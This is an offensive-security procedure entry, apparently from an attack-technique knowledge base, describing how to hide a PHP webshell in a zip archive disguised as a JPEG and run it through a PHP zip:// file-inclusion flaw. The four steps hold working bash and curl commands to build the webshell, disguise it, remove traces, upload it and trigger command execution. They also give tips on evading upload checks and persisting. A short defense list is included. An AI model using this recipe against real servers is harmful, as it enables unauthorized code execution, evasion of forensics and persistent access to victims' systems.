---
id: 0051375c-b192-4855-b640-2e2138c7239b
name: Deliver-Payload-via-Zip-Wrapper-LFI-RFI
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.357177+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
sub_techniques: []
tags:
  - file-inclusion
  - lfi
  - rfi
  - zip-wrapper
commands:
  - '[[commands/create-disguised-zip-payload-with-bash]]'
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# Deliver-Payload-via-Zip-Wrapper-LFI-RFI

## Summary

This procedure demonstrates how to create a malicious zip archive containing a PHP payload, disguise it as an image file, and deliver it to a vulnerable web server exploiting Local File Inclusion (LFI) or Remote File Inclusion (RFI) via the PHP zip:// wrapper. The technique bypasses file upload restrictions by tricking the server into processing the disguised archive as an image while executing the embedded PHP code for remote command execution.

## Description

In a zip wrapper LFI/RFI attack, an attacker crafts a zip file embedding a malicious PHP script (e.g., a webshell) and renames it to mimic a benign image like shell.jpg. When uploaded or included via a vulnerable endpoint supporting the zip:// stream wrapper (e.g., include('zip://shell.jpg#payload.php')), the server extracts and executes the PHP payload, granting arbitrary code execution. This is effective against applications that validate file extensions superficially but process content via PHP wrappers. The target environment is typically a PHP-based web server (e.g., Apache/Nginx on Linux) with allow_url_include enabled and insufficient file type checks. Success results in a reverse shell or command execution, enabling further post-exploitation like data exfiltration or privilege escalation.

## Requirements

1. Local access to a system with bash (e.g., Kali Linux) for crafting the payload.
2. A vulnerable web application endpoint allowing file uploads or LFI/RFI via zip:// wrapper.
3. Pre-existing malicious PHP payload file (e.g., payload.php containing <?php system($_GET['cmd']); ?>).
4. Network access to upload the disguised file to the target server.
5. PHP configuration on the target with zip extension enabled and wrappers allowed.

## Defense

- Implement strict input validation and sanitization to block path traversal and wrapper usage (e.g., disable allow_url_include in php.ini).
- Enforce server-side file type validation using MIME type checks and content scanning, not just extensions.
- Monitor server logs for suspicious zip:// inclusions, anomalous file uploads, or execution of image files.
- Use web application firewalls (WAFs) to detect and block LFI/RFI patterns, including wrapper streams.
- Restrict file upload directories with appropriate permissions and scan uploads for embedded executables.

## Objectives

1. Create and disguise a zip archive containing a PHP payload to evade detection.
2. Upload the payload to a vulnerable server and trigger execution via LFI/RFI with zip:// wrapper.
3. Achieve remote code execution on the target server for command injection or shell access.

## Instructions

### Step 1: Prepare the Malicious PHP Payload

**Context**: Ensure a simple PHP webshell exists as payload.php. This file will be the executable component inside the zip. Create it if needed with basic command execution functionality to test RCE.

Create the payload.php file:

```bash
cat > payload.php << EOF
<?php system(\\$_GET['cmd']); ?>
EOF
```

> This step sets up the core payload. Verify the file contents with `cat payload.php` to confirm it contains the PHP code for executing system commands via a GET parameter (e.g., ?cmd=whoami).

### Step 2: Create the Disguised Zip Archive

**Context**: Use the [[commands/create-disguised-zip-payload-with-bash]] command to bundle the PHP payload into a zip file and rename it to appear as a harmless JPEG image. This disguises the archive to bypass client-side or basic server-side checks.

**Command** ([[commands/create-disguised-zip-payload-with-bash]]):

```bash
zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php
```

> The zip command creates an archive named payload.zip containing payload.php. The mv command renames it to shell.jpg for disguise. The rm command cleans up the original PHP file to reduce forensic traces. Expected output includes confirmation messages like "adding: payload.php (deflated 50%)" from zip, and no errors from mv/rm. Verify with `file shell.jpg` which should report it as a ZIP archive.

### Step 3: Upload and Trigger the Payload

**Context**: Upload shell.jpg to the vulnerable endpoint (e.g., via a file upload form or direct POST). Then, exploit the LFI/RFI vulnerability by including the file using the zip:// wrapper, specifying the internal path to payload.php.

Use curl to upload (adapt URL and parameters to the target):

```bash
curl -X POST -F "file=@shell.jpg" http://target.com/upload.php
```

Then trigger execution:

```bash
curl "http://target.com/vulnerable.php?file=zip://uploads/shell.jpg#payload.php&cmd=id"
```

> The upload command sends the disguised file to the server. The trigger uses the zip:// wrapper to include the archive, extracting and executing payload.php. Expected output from the cmd parameter is the result of the 'id' command (e.g., uid=33(www-data)). If successful, the server executes the PHP code, confirming RCE. Decision point: If upload fails due to size/type checks, try encoding the zip or using a different disguise.

### Step 4: Verify Execution and Cleanup

**Context**: Confirm payload execution by sending commands that produce observable output. Clean up traces if needed to maintain access.

Test with a harmless command:

```bash
curl "http://target.com/vulnerable.php?file=zip://uploads/shell.jpg#payload.php&cmd=whoami"
```

> Expected output: The server's user (e.g., "www-data"). Success criteria: Command output appears in the response without errors. If no output, check server logs for inclusion errors or adjust the wrapper path. For persistence, upload additional payloads or escalate from here.
